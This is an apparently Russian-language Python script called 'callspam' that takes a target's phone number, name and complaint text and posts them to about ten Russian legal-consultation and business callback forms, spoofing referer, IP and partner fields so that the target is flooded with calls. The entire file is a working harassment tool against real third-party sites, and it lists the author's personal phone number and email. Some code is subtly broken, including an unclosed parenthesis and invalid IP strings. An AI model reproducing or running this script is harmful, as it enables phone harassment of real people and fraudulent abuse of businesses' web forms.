#!/usr/bin/python
# callspam v1
# Author: FSystem88
class callspam:
	def main(self):
		print('8888888888888888888888888\n8888888888888888888888888\n888        888        888\n888  888888888  8888  888\n888  888888888  888888888\n888  888888888  888888888\n888        888        888\n888  888888888888888  888\n888  888888888888888  888\n888  888888888  8888  888\n888  888888888        888\n8888888888888888888888888\n8888888888888888888888888\n8888    FSystem88    8888\n8888  Call Spammer!  8888\n8888      v.0.1      8888\n8888    beta test    8888\n8888888888888888888888888\n8888888888888888888888888\n')
		import requests, datetime, sys, time, argparse
		parser = argparse.ArgumentParser(prog='callspam', description="Fucking shit by FSystem88. Возможно что-то уже не работает. Только для России!",epilog='Мой номер: +79153509908 (Москва) или e-mail - FSystem88@bk.ru')
		parser.add_argument('phonenum', metavar='phone', help='Телефонный номер жертвы (пример: 79153509908)')
		parser.add_argument('--name', help='Имя жертвы (по умолчанию: Саша)')
		parser.add_argument('--text', help='Текст с жалобой (по умолчанию: Деление имущества после смерти родителей)')
		args = parser.parse_args()
		def showstatus(message, type='new'):
			now = datetime.datetime.now().strftime('%H:%M:%S')
			icon = '*'
			if type == 'warn':
				icon = '!'
			else:
				if type == 'new':
					icon == '*'
			message = '[' + icon + '][' + now + ']' + message
			return message
		def wrapsbrace(string, endspace=False):
			if endspace == True:
				return '[' + string + '] '
			return '[' + string + ']'
		def sleep(x):
			try:
				time.sleep(x)
			except KeyboardInterrupt:
				print('\r' + showstatus(wrapsbrace('except', True) + 'KeyboardInterrupt thrown! Exiting . . .', 'warn'))
				exit()
		_name = args.name
		_text = args.text
		_phone = args.phonenum
		_phoneVodaonline = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7 (915) 666-99-33'
		_phoneBukvaprava = _phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '7(915)350-99-99'
		print(showstatus(wrapsbrace('info', True) + ('Жертва: +{}').format(_phone)))
		print('Спамер запущен.\nОтправка. Пожалуйста подождите...')
		if _phone == '79153509908':
			print('Error 570984')
			exit()
		else:
			if _name == None:
				_name = 'Саша'
			if _text == None:
				_text = 'Деление имущества после смерти родителей'
			vodaonline = requests.post('https://www.vodaonline.ru/local/components/shantilab/feedback.form/ajax.php', data={'sessid': '*', 'NAME': _name, 'PHONE': _phoneVodaonline})
			yurmoscow = requests.post('https://yur-moscow.ru/ajax_call_me.php', data={'param1': _phone, 'param3': _text, 'param2': _name})
			bukvaprava = requests.post('https://bukvaprava.ru/wp-admin/admin-ajax.php', data={'text_quest_banner': _text,'name': _name,'city':'Москва','tel': _phoneBukvaprava,'ip':'192.168.1.777','form_page':'https://bukvaprava.ru/','referer':'','action':'ajax-lead'})
			yuristonline = requests.post('https://www.yurist-online.net/lead_question', data={'region':'27','question': _text,'name': _name,'phone': _phone,'email':'','partner_id':'13'})
			blablabla = requests.post('http://xn----8sbgev0cabfflr7k.xn--p1ai/scripts/form-u22118.php', data={'custom_U22127':_phoneVodaonline})
			gosur = requests.post('https://www.gos-ur.ru/zayavka/', data={'name': _name,'phone': _phone[4:11],'question': _text,'code':_phone[1:4],'type':'exit'})
			nicecream = requests.post('http://s1.nice-cream.ru/phone-widget2/sendRequest.php', data={'phone': '+'+_phone,'name': _name,'sid': '*','gclid': '0','openstat': 'direct.yandex.ru;12345678;123456789;yandex.ru:premium','utm':''})
			rossovet = requests.post('https://rossovet.ru/qa/msgsave/save', data={'name': _name, 'comment': _text, 'city': 'Москва', 'phoneprefix': '('+_phone[1:40]+')', 'phone': _phone[4:11], 'partnerID': '10', 'ref': 'https://yandex.ru/clck/', 'number1': '7', 'number2': '8', 'checkcode': '15'})
			yurkonsult = requests.post('https://yuridicheskaya-konsultaciya.com/Home/_FormPost', data={'Name': _name, 'Phone': _phone, 'Description': _text})
			epleads = requests.post('https://epleads.ru/gate/api.php', data={'question': _text,'region': 'Москва','first_last_name': _name,'phone': _phone,'ofrid': '1','wid': '3','presetid': '4','referer': 'https://potreb-prava.com/konsultaciya-yurista/konsultaciya-onlajn-yurista-besplatno-kruglosutochno.html','ip': '213.154.55.496','mobile': '0','template': 'form_master.new.fix.metrik_lawyer-blue-default','product': 'lawyer','userSoftData': '*'}

			
			#скоро добавлю еще... Ждите
			print('Готово!') 
spammer = callspam()
spammer.main()
